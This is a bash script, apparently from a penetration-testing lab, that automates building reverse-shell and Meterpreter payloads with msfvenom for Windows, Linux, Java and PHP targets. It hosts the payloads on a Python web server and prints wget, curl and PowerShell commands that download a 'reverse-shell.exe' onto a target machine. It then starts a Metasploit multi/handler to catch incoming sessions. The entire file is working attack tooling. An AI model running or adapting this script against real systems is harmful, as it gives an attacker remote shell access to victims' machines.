#!/usr/bin/bash

read -p  'IP? > ' IP

flg0="0"

if [ -d /var/www/html/$IP ]; then
   echo ""
else
   mkdir /var/www/html/$IP
fi

if [ -d /root/Lab/$IP/sandbox ]; then
   echo ""
else
   mkdir /root/Lab/$IP/sandbox
fi

while [ "$flg0" = "0" ]
do
   script=""

   flg=0

   while [ "$flg" = "0" ]
   do
      read -p  'File Type (elf/exe/macho/asp/jsp/war/php) >' ftype

      if [ -z $ftype ] ; then
         echo "Input File Type"
      elif [ $ftype = 'elf' ] || [ $ftype = 'exe' ] || [ $ftype = 'macho' ]  || [ $ftype = 'asp' ] || [ $ftype = 'jsp' ] || [ $ftype = 'war' ] || [ $ftype = 'php' ] ; then
         flg="1"
      fi
   done

   if [ $ftype = 'elf' ] ; then
      os='linux'
   fi
   if [ $ftype = 'exe' ] ; then
      os='windows'
   fi
   if [ $ftype = 'macho' ] ; then
      os='m'
   fi
   if [ $ftype = 'asp' ] ; then
      os='windows'
   fi
   if [ $ftype = 'jsp' ] ; then
      os='java'
   fi
   if [ $ftype = 'war' ] ; then
      os='java'
   fi
   if [ $ftype = 'php' ] ; then
      os='php'
   fi

#  flg=0

#   while [ "$flg" = "0" ]
#   do
#      read -p  'Windows or Linux or Mac or Java? (w/l/m/j) >' os
#
#      if [ -z $os ] ; then
#         echo "Input w or l or m or j"
#      elif [ $os = 'W' ] || [ $os = 'w' ] || [ $os = 'L' ]  || [ $os = 'l' ] || [ $os = 'M' ]  || [ $os = 'm' ] || [ $os = 'J' ]  || [ $os = 'j' ] ; then
#         flg="1"
#      fi
#   done

   flg=0

   while [ "$flg" = "0" ]
   do
      echo '32bit:x86/i386/i686/IA-32' 
      echo '64bit:x64/x86_64/x86-64/AMD64/IA-64/Intel 64'
      read -p  'X86 or X64 (86/64) >' bit

      if [ -z $bit ] ; then
         echo "Input 86 or 64"
      elif [ $bit = '86' ] || [ $bit = '64' ] ; then
         flg="1"
      fi
   done

   lhost=$(ifconfig | grep "inet 172." | cut -d " " -f10)
   echo "Local IP is $lhost"

   flg=0

   while [ "$flg" = "0" ]
   do
      read -p  'LPORT ? >' lport

      if [ -z $lport ] ; then
         echo "Input LPORT"
      else
         flg="1"
      fi
   done

   flg=0

   while [ "$flg" = "0" ]
   do
      read -p  "Shell or Meterpreter (s/m) >" payload

      if [ -z $payload ] ; then
         echo "Input s or m"
      elif [ $payload = 's' ] || [ $payload = 'm' ] ; then
         flg="1"
      fi
   done

   if [ $payload = "m" ] ; then
      payload="meterpreter"
   fi
   if [ $payload = "s" ] ; then
      payload="shell"
   fi

   if [ $os = 'windows' ] ; then
      if [ $bit = '86' ] ; then
         script1="msfvenom -p "$os"/"$payload"/reverse_tcp LHOST="$lhost" LPORT="$lport" -f "$ftype" > /var/www/html/$IP/"$os"_"$bit"_"$payload"_"$lhost"_"$lport"."$ftype
      elif [ $bit = "64" ] ; then
         script1="msfvenom -p "$os"/x64/"$payload"/reverse_tcp LHOST="$lhost" LPORT="$lport" -f "$ftype" > /var/www/html/$IP/"$os"_"$bit"_"$payload"_"$lhost"_"$lport"."$ftype
      fi
   fi
         
   if [ $os = 'linux' ] ; then
      script1="msfvenom -p "$os"/x"$bit"/"$payload"/reverse_tcp LHOST="$lhost" LPORT="$lport" -f "$ftype" > /var/www/html/$IP/"$os"_"$bit"_"$payload"_"$lhost"_"$lport"."$ftype
   fi
                  
   if [ $os = 'java' ] ; then
      payload="shell"
      if [ $ftype = "jsp" ] ; then
         script1="msfvenom -p "$os"/jsp_"$payload"_reverse_tcp LHOST="$lhost" LPORT="$lport" -f raw > /var/www/html/$IP/"$os"_"$payload"_"$lhost"_"$lport"."$ftype
      elif [ $ftype = "war" ] ; then
         script1="msfvenom -p "$os"/jsp_"$payload"_reverse_tcp LHOST="$lhost" LPORT="$lport" -f war > /var/www/html/$IP/"$os"_"$payload"_"$lhost"_"$lport"."$ftype
      fi
   fi
      
   if [ $os = 'php' ] ; then
      if [ $ftype = "php" ] ; then
         if [ $payload = "meterpreter" ] ; then
            script1="msfvenom -p php/meterpreter/reverse_tcp LHOST="$lhost" LPORT="$lport" -f raw > /var/www/html/$IP/php_"$payload"_$lhost"_"$lport.php"
         elif [ $payload = "shell" ] ; then
            script1="msfvenom -p php/reverse_php LHOST="$lhost" LPORT="$lport" -f raw > /var/www/html/$IP/php_"$payload"_$lhost"_"$lport.php"
         fi
      fi
   fi

   if [ "$script1" = "" ] ; then
      read -p "Generation Faild. Option Combination is Bad. Retry? > " retry
      if [ $retry = "Y" ] || [ $retry = "y" ] ; then
         echo ""
      else
         flg0=1
      fi
   else
      rm /root/Lab/$IP/sandbox/revshell.sh
      touch /root/Lab/$IP/sandbox/revshell.sh
#        echo "#!/bin/bash" > revshell.sh
      echo $script1 >> /root/Lab/$IP/sandbox/revshell.sh
      cat /root/Lab/$IP/sandbox/revshell.sh
      chmod 777 /root/Lab/$IP/sandbox/revshell.sh
      /root/Lab/$IP/sandbox/revshell.sh
      flg0=1      
   fi   
done

flg=0
input=""
rm /root/Lab/$IP/sandbox/temp.sh
touch /root/Lab/$IP/sandbox/temp.sh

while [ "$flg" = "0" ]
do
   read -p "Start python web server? > " input
   if [ -z $input ] ; then
      echo "Input y or n"
   elif [ $input = 'y' ] || [ $input = 'n' ] ; then
      flg="1"
   fi
done

echo "Download Reverse Shell"
echo "Filename is here "
cat /root/Lab/$IP/sandbox/revshell.sh | cut -d " " -f9 
fpath=$(cat /root/Lab/$IP/sandbox/revshell.sh | cut -d " " -f9 | cut -d "/" -f5)
echo ""

echo "wget http://"$lhost":80/$IP/"$fpath
echo "curl -OL http://"$lhost":80/$IP/"$fpath
str1='powershell.exe -c "(new-object System.Net.WebClient).DownloadFile('
str2="'http://"$lhost":80/$IP/"$fpath"','C:\Users\Public\reverse-shell.exe')"
str3='"'
echo $str1$str2$str3
str1='Invoke-WebRequest -Uri "'
str2='http://'$lhost':80/$IP/'$fpath'" -OutFile "C:\Users\Public\reverse-shell.exe"'
echo $str1$str2

if [ $input = 'y' ] ; then
   echo "cd /var/www/html/$IP/" >> /root/Lab/$IP/sandbox/temp.sh
   echo "python3 -m http.server 80" >> /root/Lab/$IP/sandbox/temp.sh
fi 

flg=0
input=""

while [ "$flg" = "0" ]
do
   read -p "Start multi/handler? > " input
   if [ -z $input ] ; then
      echo "Input Y or N"
   elif [ $input = 'y' ] || [ $input = 'n' ] ; then
      flg="1"
   fi
done

if [ $input = 'Y' ] || [ $input = 'y' ] ; then
   rm /root/Lab/$IP/sandbox/multi_handler.rc
   touch /root/Lab/$IP/sandbox/multi_handler.rc
   echo "use exploit/multi/handler" >> /root/Lab/$IP/sandbox/multi_handler.rc
   echo "set PAYLOAD "$(head -n 1 /root/Lab/$IP/sandbox/revshell.sh | cut -d " " -f3) >> /root/Lab/$IP/sandbox/multi_handler.rc
   echo "set LHOST "$lhost >> /root/Lab/$IP/sandbox/multi_handler.rc
   echo "set LPORT "$lport >> /root/Lab/$IP/sandbox/multi_handler.rc
   echo "set ExitOnSession false" >> /root/Lab/$IP/sandbox/multi_handler.rc
   echo "exploit -j -z" >> /root/Lab/$IP/sandbox/multi_handler.rc
   cat /root/Lab/$IP/sandbox/multi_handler.rc
   echo "msfconsole -r /root/Lab/$IP/sandbox/multi_handler.rc" >> /root/Lab/$IP/sandbox/temp.sh
fi
chmod 777 /root/Lab/$IP/sandbox/temp.sh
/root/Lab/$IP/sandbox/temp.sh

